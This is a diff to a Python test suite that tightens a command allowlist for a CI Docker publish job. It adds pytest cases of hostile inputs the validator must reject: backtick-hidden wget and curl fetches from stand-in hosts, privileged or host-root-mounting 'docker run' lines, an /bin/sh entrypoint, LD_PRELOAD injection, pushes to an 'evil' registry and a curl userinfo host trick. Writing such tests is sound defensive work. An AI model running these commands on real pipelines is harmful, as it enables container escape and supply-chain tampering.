@@ -37,6 +37,8 @@ ALLOWED_PUBLISH_ACTIONS = {
     "docker/build-push-action@10e90e3645eae34f1e60eeb005ba3a3d33f178e8",
 }
 CANDIDATE_IMAGE = '"${IMAGE_NAME}@${{ steps.image.outputs.digest }}"'
+# The candidate image as one shell word, after shlex has removed the quotes.
+CANDIDATE_WORD = "${IMAGE_NAME}@${{ steps.image.outputs.digest }}"
 
 
 @dataclass
@@ -565,6 +567,23 @@ ALLOWED_COMMANDS = {
 SHELL_KEYWORDS = {"if", "then", "else", "elif", "do", "while", "until", "!", "{"}
 SHELL_TERMINATORS = {"fi", "done", "}", "]]"}
 DOCKER_SUBCOMMANDS = {"pull", "run", "logs", "manifest", "buildx", "rm"}
+# Only the forms today's publish job needs. Anything else, such as
+# `docker buildx build --push` or `docker manifest push`, is rejected.
+DOCKER_NESTED_SUBCOMMANDS = {
+    "buildx": {("imagetools", "create"), ("imagetools", "inspect")},
+    "manifest": {("inspect",)},
+}
+# `docker run` may only start the candidate digest with exactly these options;
+# --privileged, -v/--mount, --entrypoint, --device, --pid, ... are all rejected.
+DOCKER_RUN_FLAGS = {"-d"}
+DOCKER_RUN_OPTIONS = {
+    "--name": re.compile(r"^ghidra-mcp-ci$"),
+    "--network": re.compile(r"^host$"),
+    "-e": re.compile(r"^GHIDRA_MCP_(PUBLIC_URL|AUTH_TOKEN)="),
+}
+# Plain fetches only: no -L/--location, -o/-O, -H, -x, --resolve, --unix-socket.
+CURL_OPTIONS = {"-f", "-s", "-S", "-fsS", "--fail", "--silent", "--show-error"}
+LOCAL_URL = re.compile(r"^http://127\.0\.0\.1:[0-9]+(/[A-Za-z0-9._~/-]*)?$")
 SEPARATORS = {";", "&&", "||", "|", "|&", "&", "(", ")"}
 REDIRECTIONS = {">", ">>", "<", "<<", "<<<", ">&", "<&", "&>", ">|"}
 
@@ -637,23 +656,63 @@ def _simple_commands(line: str) -> list[list[str]]:
     return simple
 
 
+def _docker_run_problems(args: list[str], line: str) -> list[str]:
+    index = 0
+    while index < len(args) and args[index].startswith("-"):
+        option = args[index]
+        if option in DOCKER_RUN_FLAGS:
+            index += 1
+        elif option in DOCKER_RUN_OPTIONS and index + 1 < len(args):
+            if not DOCKER_RUN_OPTIONS[option].match(args[index + 1]):
+                return [f"docker run {option} {args[index + 1]} is not allowed: {line}"]
+            index += 2
+        else:
+            return [f"docker run option {option} is not allowed: {line}"]
+    if args[index:] != [CANDIDATE_WORD]:
+        return [f"docker run of anything but the candidate: {line}"]
+    return []
+
+
+def _docker_problems(words: list[str], line: str) -> list[str]:
+    subcommand = words[1] if len(words) > 1 else ""
+    if subcommand not in DOCKER_SUBCOMMANDS:
+        return [f"docker {subcommand} is not allowed: {line}"]
+    nested = DOCKER_NESTED_SUBCOMMANDS.get(subcommand)
+    if nested is not None and not any(tuple(words[2 : 2 + len(form)]) == form for form in nested):
+        return [f"docker {subcommand} {' '.join(words[2:4])} is not allowed: {line}"]
+    if subcommand == "pull" and words[2:] != [CANDIDATE_WORD]:
+        return [f"docker pull of anything but the candidate: {line}"]
+    if subcommand == "run":
+        return _docker_run_problems(words[2:], line)
+    return []
+
+
+def _curl_problems(words: list[str], line: str) -> list[str]:
+    options = [word for word in words[1:] if word.startswith("-")]
+    urls = [word for word in words[1:] if not word.startswith("-")]
+    if any(option not in CURL_OPTIONS for option in options):
+        return [f"curl option other than {sorted(CURL_OPTIONS)}: {line}"]
+    if not urls or not all(LOCAL_URL.match(url) for url in urls):
+        return [f"curl outside localhost: {line}"]
+    return []
+
+
 def _disallowed_commands(script: str) -> list[str]:
     problems = []
     for line in _logical_lines(script):
+        if "`" in line:
+            # Backtick substitutions are not split out like $(...), so a command
+            # nested in them would hide behind an allowed one such as echo.
+            problems.append(f"backtick command substitution: {line}")
+            continue
         for words in _simple_commands(line):
             command = words[0]
             if command not in ALLOWED_COMMANDS:
                 problems.append(f"{command!r} is not allowed: {line}")
             elif command == "docker":
-                subcommand = words[1] if len(words) > 1 else ""
-                if subcommand not in DOCKER_SUBCOMMANDS:
-                    problems.append(f"docker {subcommand} is not allowed: {line}")
-                elif subcommand == "run" and not line.endswith(CANDIDATE_IMAGE):
-                    problems.append(f"docker run of anything but the candidate: {line}")
+                problems.extend(_docker_problems(words, line))
             elif command == "curl":
-                urls = [word for word in words if "://" in word]
-                if not urls or not all(url.startswith("http://127.0.0.1:") for url in urls):
-                    problems.append(f"curl outside localhost: {line}")
+                problems.extend(_curl_problems(words, line))
             elif command == "python3":
                 if (
                     len(words) < 3
@@ -686,6 +745,67 @@ def _disallowed_commands(script: str) -> list[str]:
 )
 def test_publish_command_allowlist_rejects(script: str) -> None:
     assert _disallowed_commands(script)
+
+
+CANDIDATE_RUN = (
+    'docker run -d --name ghidra-mcp-ci --network host -e GHIDRA_MCP_AUTH_TOKEN="$TOKEN" '
+)
+
+
+# SAF-44: counterexamples from the PR #15 review (L1-L4). Each one passed the
+# allowlist before it was tightened; each must keep failing it.
+@pytest.mark.parametrize(
+    "script",
+    [
+        pytest.param("echo `wget http://example.invalid/x`", id="backtick-in-echo"),
+        pytest.param('HEALTH="`curl -fsS http://example.invalid/`"', id="backtick-in-assignment"),
+        pytest.param("docker buildx build --push -t ghcr.io/evil/x .", id="buildx-build-push"),
+        pytest.param("docker buildx imagetools push x", id="buildx-imagetools-other"),
+        pytest.param("docker manifest push ghcr.io/evil/x", id="manifest-push"),
+        pytest.param("docker pull alpine", id="pull-arbitrary-image"),
+        pytest.param("docker pull alpine " + CANDIDATE_IMAGE, id="pull-arbitrary-plus-candidate"),
+        pytest.param(
+            "docker pull --platform linux/arm64 " + CANDIDATE_IMAGE, id="pull-extra-option"
+        ),
+        pytest.param(CANDIDATE_RUN + "--privileged " + CANDIDATE_IMAGE, id="run-privileged"),
+        pytest.param(CANDIDATE_RUN + "-v /:/host " + CANDIDATE_IMAGE, id="run-mount-root"),
+        pytest.param(
+            CANDIDATE_RUN + "--mount type=bind,src=/,dst=/host " + CANDIDATE_IMAGE,
+            id="run-mount-option",
+        ),
+        pytest.param(
+            CANDIDATE_RUN + "--entrypoint /bin/sh " + CANDIDATE_IMAGE, id="run-entrypoint"
+        ),
+        pytest.param("docker run -dv /:/host " + CANDIDATE_IMAGE, id="run-bundled-short-flags"),
+        pytest.param(
+            "docker run -d --network container:x " + CANDIDATE_IMAGE, id="run-other-network"
+        ),
+        pytest.param("docker run -d -e LD_PRELOAD=/x.so " + CANDIDATE_IMAGE, id="run-foreign-env"),
+        pytest.param("docker run -d " + CANDIDATE_IMAGE + " id", id="run-trailing-argv"),
+        pytest.param("curl -L http://127.0.0.1:8765/health", id="curl-L"),
+        pytest.param("curl -fsSL http://127.0.0.1:8765/health", id="curl-fsSL"),
+        pytest.param("curl --location http://127.0.0.1:8765/health", id="curl-location"),
+        pytest.param("curl -fsS -o /tmp/x http://127.0.0.1:8765/health", id="curl-output-file"),
+        pytest.param("curl -fsS http://127.0.0.1:8765@example.invalid/", id="curl-userinfo-host"),
+    ],
+)
+def test_publish_command_allowlist_rejects_review_gaps(script: str) -> None:
+    assert _disallowed_commands(script)
+
+
+@pytest.mark.parametrize(
+    "script",
+    [
+        "docker pull " + CANDIDATE_IMAGE,
+        CANDIDATE_RUN + "-e GHIDRA_MCP_PUBLIC_URL=http://127.0.0.1:8765 " + CANDIDATE_IMAGE,
+        "docker buildx imagetools create --tag x " + CANDIDATE_IMAGE,
+        "docker buildx imagetools inspect x --format '{{json .Manifest.Digest}}'",
+        'if X="$(docker manifest inspect "${IMAGE_NAME}:v" 2>&1)"; then exit 1; fi',
+        'HEALTH="$(curl -fsS http://127.0.0.1:8765/health || true)"',
+    ],
+)
+def test_publish_command_allowlist_accepts_the_forms_in_use(script: str) -> None:
+    assert _disallowed_commands(script) == []
 
 
 def test_publish_job_runs_only_allowlisted_commands() -> None:
